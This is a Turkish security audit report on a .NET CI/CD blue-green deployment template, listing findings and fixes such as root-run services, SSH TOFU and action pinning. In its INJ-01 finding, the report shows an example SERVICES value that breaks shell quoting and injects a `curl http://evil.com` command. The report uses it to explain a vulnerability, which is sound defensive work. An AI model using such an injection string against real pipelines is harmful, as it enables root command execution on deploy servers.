# Güvenlik Denetim Raporu — dotnet-cicd-template

**Kapsam:** `SV&V (Software Verification & Validation)` perspektifinden manuel kod incelemesi.  
**Tarih:** 2026-07-08  
**İncelenen dosyalar:** `production-deploy.yml`, `production-rollback.yml`, `continuous-integration.yml`, `reusable-dotnet-build.yml`, `pipeline.sh`, `ssh-remote.sh`, `verify-health.sh`, `setup-host.sh`, `build-test/action.yml`  
**Mimari:** Blue-green (nginx + Unix socket, `cicd` grubu)  
**Yöntem:** Statik analiz / kod okuma — çalışan ortam testi yapılmamıştır.  
**Not:** Bu rapor yalnızca bulgular içerir; **raporda onay olmadan hiçbir kod değişikliği yapılmayacaktır.**

---

## Özet Puan Tablosu

| ID | Başlık | Önem | Dosya | Durum |
|---|---|---|---|---|
| ROOT-01 | .NET servisleri systemd'de root çalışıyordu (`User=` yok) | **YÜKSEK** | `setup-host.sh` | **GİDERİLDİ** (2026-07-09) |
| STATE-01 | Blue-green aktif renk, nginx conf metninden grep ile okunuyordu | **ORTA-YÜKSEK** | `pipeline.sh` | **GİDERİLDİ** (2026-07-09) |
| HOSTKEY-01 | `SSH_KNOWN_HOSTS` boşsa `ssh-keyscan` ile TOFU (MITM) | **ORTA** | `ssh-remote.sh` | **GİDERİLDİ** (2026-07-09) |
| INJ-01 | `remote_sudo` komut enjeksiyonu (SERVICES alanları) | **ORTA** | `pipeline.sh` | **GİDERİLDİ** |
| TMP-01 | Uzak geçici dosya yolu tahmin edilebilir (`/tmp/cicd-env-$$`) | **DÜŞÜK** | `pipeline.sh` | **GİDERİLDİ** |
| PIN-01 | Action sürümlerinde SHA yerine etiket kullanımı | **DÜŞÜK-ORTA** | Tüm workflow'lar | **GİDERİLDİ** (SHA pin + Dependabot, 2026-07-09) |
| FORK-01 | `pull_request` tetikleyicisi + self-hosted runner | **DÜŞÜK** | `continuous-integration.yml` | **GİDERİLDİ** (fork PR atlanıyor, 2026-07-09) |
| DOC-01 | "byte-for-byte identical" fazla iddialı (test≠publish çıktısı) | **DÜŞÜK** | `README.md`, playbook | **GİDERİLDİ** (2026-07-09) |
| LIC-01 | Public template'te LICENSE yok | **DÜŞÜK** | kök | **GİDERİLDİ** (MIT, 2026-07-09) |
| SUDO-01 | Deploy kullanıcısı `NOPASSWD: ALL` (geniş sudo) | **ORTA** | `ssh-remote.sh` + docs | **AZALTILDI** (servisler artık root değil; kapsamlı-sudo helper gelecek çalışma) |
| NX-01 | nginx socket izin modeli (cicd grubu, UMask) | **BİLGİ** | `setup-host.sh` | Kabul edilebilir (tasarım gereği) |
| CLEANUP-01 | SSH anahtar dosyası `SIGKILL`'de temizlenmiyor | **BİLGİ** | `ssh-remote.sh` | Açık (standart kısıt) |

**2026-07-09 güncellemesi:** Bağımsız bir ikinci inceleme, ilk denetimin (2026-07-08) atladığı iki önemli bulguyu ortaya çıkardı: servislerin root çalışması (ROOT-01) ve blue-green renk tespitinin kırılganlığı (STATE-01). İkisi de giderildi; ayrıntılar aşağıda.

---

## Bulgu Detayları

### ROOT-01 — .NET Servisleri Root Çalışıyordu ✅ GİDERİLDİ
**Önem:** YÜKSEK  
**Dosya:** `setup-host.sh` (systemd birim şablonu)

**Kanıt (önce):** Oluşturulan `[Service]` bloğunda `Group=cicd`, `UMask=0007` vardı fakat **`User=` yoktu**. `User=` tanımsızsa systemd birimi **root** olarak çalışır. Yani uygulamada (RCE, deserialization vb.) bir açık, doğrudan root ele geçirmeye dönüşebilirdi.

**Uygulanan düzeltme:** Her servis için login'siz, sistem hesabı oluşturulur (`useradd --system --no-create-home --shell /usr/sbin/nologin --gid cicd cicd-<svc>`). Birim artık `User=cicd-<svc>` ile ve şu sertleştirme yönergeleriyle çalışır: `NoNewPrivileges=yes`, `ProtectSystem=full`, `ProtectHome=yes`, `PrivateTmp=yes`, `ProtectControlGroups=yes`, `ProtectKernelTunables=yes`, `RestrictSUIDSGID=yes`. Socket erişimi `Group=cicd` ile korunur (socket `0660 cicd-<svc>:cicd`; nginx `cicd` grubunda). `.env` artık `0640 cicd-<svc>:cicd` olarak yazılır ki düşük yetkili servis `EnvironmentFile` ile okuyabilsin.

**Kalan not:** `cicd-<svc>` hesabının home'u yoktur; ASP.NET DataProtection anahtarlarını kalıcı saklamak gerekirse birime `ReadWritePaths=<dir>/keys` eklenip uygulamada KeyDir tanımlanmalıdır (birim şablonunda yorum olarak belirtildi).

---

### STATE-01 — Blue-Green Aktif Renk Tespiti Kırılgandı ✅ GİDERİLDİ
**Önem:** ORTA-YÜKSEK  
**Dosya:** `pipeline.sh` (`color_active`, `cmd_switch`, `cmd_rollback`)

**Kanıt (önce):** Aktif renk, nginx upstream include dosyasının **metninden** okunuyordu: `grep -oE 'blue|green' <conf> | head -1`. Üç problem:
- **(A) Yaz-sonra-reload sırası:** `cmd_switch` önce include dosyalarını yeni renge yazıp sonra `nginx -t && reload` yapıyordu. Reload başarısız olursa disk yeni rengi, çalışan nginx eski rengi gösteriyordu → bir sonraki deploy yanlış rengi okuyup **canlı rengin üzerine** yazabilirdi.
- **(B) Yarım rollback:** `cmd_rollback` servis servis yazıp, sonraki serviste rollback dizini yoksa reload'dan önce duruyordu; bazı include dosyaları değişmiş, nginx reload edilmemiş kalıyordu.
- **(C) İsim çakışması:** Servis adında `blue`/`green` geçerse (`blue-api`), `grep|head -1` gerçek renk yerine isimdeki kelimeyi okuyordu.

**Uygulanan düzeltme:**
- Aktif renk artık ayrı, tek-değerli **durum dosyasından** okunur: `/etc/nginx/cicd/<svc>.active` (kesin kaynak). `setup-host.sh` bunu `blue` ile başlatır. `grep blue|green` kaldırıldı → (C) çözüldü.
- Durum dosyası **yalnızca başarılı `nginx reload`'dan sonra** yazılır (`write_active_color`). Reload başarısızsa `set -e` ile çıkılır, state güncellenmez → disk/canlı tutarlı kalır → (A) çözüldü.
- `cmd_rollback` üç fazlı: (1) tüm rollback hedeflerini doğrula (yazma yok), (2) hepsi geçerliyse include'ları yaz, (3) reload sonrası state'i güncelle. Yarım uygulama olmaz → (B) çözüldü.
- Include ve state yazımı hem uzak hem yerelde atomiktir (tmp'ye yaz + `mv`).

---

### HOSTKEY-01 — `SSH_KNOWN_HOSTS` Boşsa TOFU (MITM) ✅ GİDERİLDİ
**Önem:** ORTA  
**Dosya:** `ssh-remote.sh` (`ssh_remote_init`)

**Kanıt (önce):** `SSH_KNOWN_HOSTS` verilmezse kod `ssh-keyscan` ile sunucu anahtarını **otomatik kabul** ediyordu (trust-on-first-use). İlk bağlantıda araya giren bir saldırgan (MITM) kendi anahtarını kabul ettirebilirdi. `StrictHostKeyChecking=yes` olması bu fallback yüzünden anlamsızlaşıyordu.

**Uygulanan düzeltme:** `SSH_KNOWN_HOSTS` artık **zorunlu**. Boşsa uzak deploy net bir hatayla reddedilir (fail-closed) ve `ssh-keyscan` ile nasıl üretileceği gösterilir. `ssh-keyscan` fallback tamamen kaldırıldı.

---

### INJ-01 — `remote_sudo` Komut Enjeksiyonu ✅ GİDERİLDİ
**Önem:** ORTA  
**Dosya/Satır:** `pipeline.sh`, `target_publish_dir`, `target_write_env_one`, `target_restart_one`

**Kanıt:**
```bash
# pipeline.sh – target_publish_dir
remote_sudo "mkdir -p '$dest'"

# pipeline.sh – target_restart_one
remote_sudo "systemctl restart '${unit}'"
```

`$dd` (deploy_dir) ve `$svc` (service_name) değerleri `SERVICES` repo değişkeninden gelir. `remote_sudo` içinde bu değerler tek-tırnak içine yerleştirilir; ancak `$dd` veya `$svc` değeri tek-tırnak (`'`) içeriyorsa bash string'i parçalanır ve enjekte edilen komut `sudo bash -c` ile çalışır.

**Örnek saldırı vektörü:**  
```
SERVICES="web|src/Web.csproj|/opt/myapp'; curl http://evil.com|myapp-web|http://127.0.0.1:5000"
```
Bu değer deploy_dir'e `/opt/myapp'` yerleştirerek `remote_sudo` string'ini kırar.

**Azaltıcı faktörler:**
- `SERVICES` yalnızca repo yöneticileri tarafından ayarlanabilir (GitHub Settings → Variables), dolayısıyla saldırı vektörü **içeriden** veya ele geçirilmiş bir GitHub hesabı gerektirir.
- `printf '%q'` SSH kanalını güvenli hale getirir; sorun bash string'inin kendisindedir.
- Üretim repo'ları genellikle kısıtlı erişimlidir; gerçek dünya riski düşüktür.

**Uygulanan düzeltme:** `pipeline.sh`'e `validate_path_field()` ve `validate_name_field()` fonksiyonları eklendi. `validate_services()` her komut çalışmadan önce SERVICES içindeki `deploy_dir` (alan 3) ve `service_name` (alan 4) değerlerini whitelist regex ile doğrular (`^[a-zA-Z0-9/_.@-]+$` / `^[a-zA-Z0-9_.@-]+$`). Geçersiz karakter içeren değer `exit 1` ile hemen reddedilir. Mevcut kullanımları etkilemez; bu karakterlerin dışına çıkan hiçbir geçerli Unix yolu veya systemd birim adı yoktur.

---

### PIN-01 — Action Sürümlerinde SHA Yerine Etiket ✅ GİDERİLDİ (SHA pin)
**Önem:** DÜŞÜK-ORTA  
**Dosya/Satır:** Tüm workflow'lar

**Kanıt:**
```yaml
uses: actions/checkout@v4
uses: actions/cache@v4
uses: actions/upload-artifact@v4
```

**Sorun:** `@v4` gibi etiketler GitHub tarafından herhangi bir zamanda yeni bir commit'e yönlendirilebilir (tag mutation). Güvenlik standartlarına (SLSA L3, OpenSSF Scorecard) göre commit SHA ile pin'leme önerilir:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Azaltıcı faktörler:**
- `actions/checkout`, `actions/cache`, `actions/upload-artifact` GitHub'ın resmi action'larıdır; kötü amaçlı değişiklik olasılığı düşüktür.
- Self-hosted runner ortamı, GitHub-hosted runner'a göre zaten kontrollüdür.
- Bu template bir şablon reposudur; kullanıcı reposu bu action'ları kendi workflow'larında çalıştırır — GitHub-hosted runner kullanılıyorsa risk daha anlamlıdır.

**Uygulanan düzeltme (2026-07-09):** Tüm resmi action'lar tam commit SHA'ya pinlendi ve okunabilirlik için `# vX.Y.Z` yorumu bırakıldı:
- `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`
- `actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0`
- `actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2`

Ek olarak `dependabot.yml` (haftalık) güncelleme PR'ları önermeye devam eder. Böylece hem tag-mutation'a karşı bağışıklık (immutable SHA) hem de düzenli güncelleme sağlanır.

---

### FORK-01 — `pull_request` + Self-Hosted Runner ✅ GİDERİLDİ
**Önem:** DÜŞÜK  
**Dosya/Satır:** `continuous-integration.yml`, satır 13–14

**Kanıt:**
```yaml
on:
  pull_request:
    branches: [ main ]
```

**Sorun:** Repo herkese açık olursa, fork'tan gelen PR'lar `pull_request` olayını tetikler ve **self-hosted runner üzerinde fork'taki kod çalışır**. Bu, runner'da yerel erişim anlamına gelebilir.

**Azaltıcı faktörler:**
- Template genellikle **private** proje repolarında kullanılır; fork PR senaryosu tipik kullanımda yoktur.
- GitHub, fork PR'lar için self-hosted runner'da gizli değişkenleri maskeler (Secrets fork'a açılmaz).

**Uygulanan düzeltme (2026-07-09):** `build-test` job'ına iş-seviyesi koşul eklendi: fork'tan gelen PR'lar self-hosted runner'da **çalıştırılmaz**.
```yaml
if: >-
  github.event_name != 'pull_request' ||
  github.event.pull_request.head.repo.full_name == github.repository
```
Aynı repodan gelen PR'lar ve `main`'e push'lar normal çalışır; fork PR'ları atlanır (guvenilmeyen kod kalıcı runner'da/production ağına yakın koşmaz).

---

### TMP-01 — Uzak Geçici Dosya Yolu (`/tmp/cicd-env-$$`) ✅ GİDERİLDİ
**Önem:** DÜŞÜK  
**Dosya/Satır:** `pipeline.sh` – `target_write_env_one`

**Kanıt:**
```bash
local tmp="/tmp/cicd-env-$$"
remote_write_file "$content" "$tmp" 600
remote_sudo "mv '$tmp' '${dd}/.env' && chmod 600 '${dd}/.env' && ..."
```

**Sorun:** `/tmp/cicd-env-<PID>` yolu, PID tahmin edilerek sembolik bağlantı (symlink) saldırısına konu olabilir: hedef sunucuya yerel erişimi olan bir saldırgan dosyadan önce bu yola symlink yerleştirirse rsync farklı bir dosyanın üzerine yazabilir (TOCTOU).

**Azaltıcı faktörler:**
- Saldırı, hedef sunucuda **yerel bir hesap** gerektirir.
- Deploy kullanıcısı dışında bir hesap bu sunucuda bulunuyor olmalıdır.
- Güvenli sunucu ortamlarında pratikte ihmal edilebilir.

**Uygulanan düzeltme:** `tmp="$(remote_ssh "mktemp /tmp/cicd-env-XXXXXX")"` ile rassal suffix üretilir. `mktemp` tüm modern Linux dağıtımlarında vardır; işleyiş değişmez.

---

### NX-01 — nginx Socket İzin Modeli
**Önem:** BİLGİ  
**Dosya:** `setup-host.sh`

**Model:** Her blue/green systemd birimi `User=cicd-<svc>` (düşük yetkili), `Group=cicd`, `UMask=0007` ile çalışır (bkz. ROOT-01). Kestrel bu ayarlarla Unix socket'i `0660 cicd-<svc>:cicd` olarak oluşturur. nginx kullanıcısı (`www-data`/`nginx`) `usermod -aG cicd` ile `cicd` grubuna eklenmiştir; dolayısıyla nginx socket'e bağlanabilir. Diğer sistem kullanıcıları grupta değilse sokete erişemez.

**Deploy kullanıcısı ve health kontrolü:** Deploy kullanıcısı `cicd` grubuna **eklenmez** (yüzey daraltılır). Bu nedenle pipeline'ın idle renk socket sağlık kontrolü (`pipeline.sh health`), socket'e `sudo` (root) ile erişir (`remote_sudo_stdin`). Root her socket'e erişebildiğinden bu doğru çalışır ve deploy kullanıcısının socket grubuna dahil edilmesine gerek kalmaz. Bu, zaten gereken `NOPASSWD: ALL` yetkisiyle tutarlıdır (bkz. operasyonel not).

**Değerlendirme:**
- `cicd` grubu yalnızca nginx ve .NET servis kullanıcılarını içerir; deploy kullanıcısı grupta değildir — dar kapsam iyi uygulama.
- `RuntimeDirectoryPreserve=yes` iki renk aynı anda çalışırken `/run/cicd/` silinmesini önler.
- Sistemd `RuntimeDirectory=cicd` her unit başlatılışında `/run/cicd/` sahipliğini `root` olarak ayarlar; grub `cicd` bırakır (mode `0750`); bu tasarım socket erişimini kontrollü tutar.
- **Potansiyel öneri:** `Group=cicd` birimlerin *aynı* `cicd` grubunu kullanması socket erişimini `nginx` ile paylaşır ancak sistemdeki başka `cicd` üyelerini de dahil eder; bu kullanıcı sayısını mümkün olduğunca az tutarak yönetilebilir kılar.

**Karar:** Tasarım gereği kabul edilebilir; dokümantasyonda belirtilmiştir.

---

### CLEANUP-01 — SSH Anahtar Dosyası `SIGKILL`'de Temizlenmiyor
**Önem:** BİLGİ  
**Dosya/Satır:** `ssh-remote.sh`, satır 123

**Kanıt:**
```bash
trap ssh_remote_cleanup EXIT
```

**Sorun:** `SIGKILL` sinyali bash `trap` mekanizmasını atlatır. Pipeline süreç `kill -9` ile sonlandırılırsa `$SSH_KEY_FILE` geçici dosyası (`chmod 600`) temizlenmeden kalabilir.

**Azaltıcı faktörler:**
- Dosya `chmod 600` ile korunur; başka kullanıcılar okuyamaz.
- CI runner'ında her job'ın kendi çalışma alanı vardır; job sona erince runner ortamı temizlenir.
- `SIGKILL` ile job sonlandırma GitHub Actions'ta nadirdir.

**Önerilen düzeltme (opsiyonel):** `tmpfs`-tabanlı geçici dizin veya runner job sonrası temizleme scripti; pratik olarak mevcut durum kabul edilebilir.

---

## Olumlu Bulgular (İyi Uygulanan)

| Alan | Kanıt |
|---|---|
| En az yetki (least privilege) | Tüm workflow'larda `permissions: contents: read` (deploy'da ek `actions: read`) |
| Artifact köken doğrulaması (provenance) | `production-deploy.yml`: `headSha == github.sha` kontrolü |
| SSH güvenliği | `StrictHostKeyChecking=yes`, `BatchMode=yes`, `ConnectTimeout=15` |
| SSH anahtar ömrü | Geçici dosya (`mktemp`), `chmod 600`, `trap ... EXIT` temizleme |
| PerSourcePenalties önlemi | `ssh-keyscan` tekrar edilmiyor; `ssh-keygen -F` ile önce kontrol |
| Gizli bilgi sızıntısı yok | Hiçbir `echo` / `cat` komutu secret değerleri loglara yazmıyor |
| Onay kapısı | `environment: production` + required reviewers + prevent self-review |
| Eşzamanlılık kontrolü | `concurrency: group: deploy-${{ github.repository }}, cancel-in-progress: false` |
| Blue-green fail-safe | Health socket geçemezse nginx geçişi yapılmaz; canlı etkilenmez; job başarısız |
| Validate adımı | Deploy başlangıcında SERVICES, SSH değişkenleri doğrulanıyor |
| Socket izin modeli | `cicd` grubu, `UMask=0007` → socket `0660`; yalnızca nginx erişir |
| Düşük yetkili servis | `User=cicd-<svc>` + `NoNewPrivileges`/`ProtectSystem`/`PrivateTmp` sertleştirme |
| Aktif renk kesin kaynağı | Ayrı state dosyası; yalnızca başarılı reload sonrası yazım (atomik) |
| Şablonun kendi CI'ı | github-hosted runner'da ShellCheck + actionlint self-test |

---

## Sonuç

Şablon genel olarak **güvenli** bir tasarıma sahiptir. İlk denetimdeki (2026-07-08) bulgulara ek olarak, bağımsız ikinci inceleme (2026-07-09) iki önemli bulgu daha ortaya çıkardı; hepsi giderildi:

**2026-07-08:**
- **INJ-01 (ORTA):** `validate_services()` ile SERVICES alanları whitelist doğrulamasından geçiyor.
- **TMP-01 (DÜŞÜK):** Uzak geçici dosya `mktemp` ile rassal isim alıyor.

**2026-07-09:**
- **ROOT-01 (YÜKSEK):** Servisler artık `User=cicd-<svc>` (düşük yetkili) + systemd sertleştirme ile çalışıyor; root değil.
- **STATE-01 (ORTA-YÜKSEK):** Blue-green aktif renk ayrı state dosyasından okunuyor; state yalnızca başarılı reload sonrası yazılıyor; rollback üç fazlı (atomik).
- **HOSTKEY-01 (ORTA):** `SSH_KNOWN_HOSTS` zorunlu; `ssh-keyscan` TOFU fallback kaldırıldı.
- **PIN-01 (DÜŞÜK-ORTA):** Tüm action'lar tam commit SHA'ya pinlendi (+ Dependabot).
- **FORK-01 (DÜŞÜK):** Fork PR'ları self-hosted runner'da çalıştırılmıyor.
- **DOC-01 (DÜŞÜK):** "byte-for-byte identical" iddiası "aynı doğrulanmış commit" olarak düzeltildi.
- **LIC-01 (DÜŞÜK):** Kök dizine MIT LICENSE eklendi.
- **CI (olgunluk):** Blueprint'in kendi self-CI'ı eklendi (`.github/workflows/blueprint-selftest.yml`) — github-hosted runner'da ShellCheck + actionlint.

**Kısmi / kabul edilebilir bulgular:**
- **SUDO-01 (ORTA → azaltıldı):** Uygulama root değil; deploy kullanıcısının geniş sudo'su ise kapsamlı-sudo helper ile gelecekte daraltılacak (bkz. SUDO-01).

- **NX-01 (BİLGİ):** nginx socket izin modeli `cicd` grubu + UMask tasarımı kabul edilebilir; `cicd` grubunu dar tutun.
- **FORK-01 (DÜŞÜK):** `pull_request` + self-hosted runner riski yalnızca **public** repo'da anlamlıdır. Bu şablon private proje repoları için tasarlanmıştır; public kullanımda PR'lar için ek bir onay kapısı önerilir.
- **CLEANUP-01 (BİLGİ):** `SIGKILL` sonrası geçici SSH anahtar dosyası bilinen bir kısıttır; `chmod 600` ve izole runner çalışma alanı ile pratik risk düşüktür.

### SUDO-01 — Deploy Kullanıcısı `NOPASSWD: ALL` ⚠️ AZALTILDI (kısmi)
**Önem:** ORTA  
**Dosya:** `ssh-remote.sh` (`remote_sudo`) + docs

**Kanıt:** `remote_sudo` komutları hedef sunucuda `sudo bash -c "..."` ile çalışır; bu yüzden deploy kullanıcısı **tam `NOPASSWD: ALL`** yetkisine ihtiyaç duyar. Deploy SSH anahtarını ele geçiren biri sunucuda root olabilir.

**Uygulanan azaltma (2026-07-09):** En büyük türev risk kapatıldı — **uygulama artık root çalışmıyor** (ROOT-01). Yani bir uygulama açığı otomatik root vermiyor; root yolu yalnızca deploy pipeline'ının kendisinden geçiyor.

**Kalan risk ve öneri (gelecek çalışma):** `sudo bash -c` modeli dar bir komut whitelist'i ile bağdaşmaz. Kök çözüm, sabit bir root-sahipli **yardımcı script** (ör. `install-file`, `restart <unit>`, `nginx-reload`, `set-active <svc> <color>` alt-komutları) yazıp sudoers'ı yalnızca o script'e izin verecek şekilde kısıtlamaktır. Bu, `ssh-remote.sh` + `pipeline.sh` + `setup-host.sh` üçlüsünde daha büyük bir refactor ve **canlı sunucuda test** gerektirdiğinden, kör (test edilmeden) uygulanması "yarım/kırık iş" riski taşır; ayrı bir görev olarak bırakıldı. Ara önlem: deploy kullanıcısını **yalnızca deploy'a adanmış** bir host/kullanıcı yapın ve SSH anahtarını dar tutun.
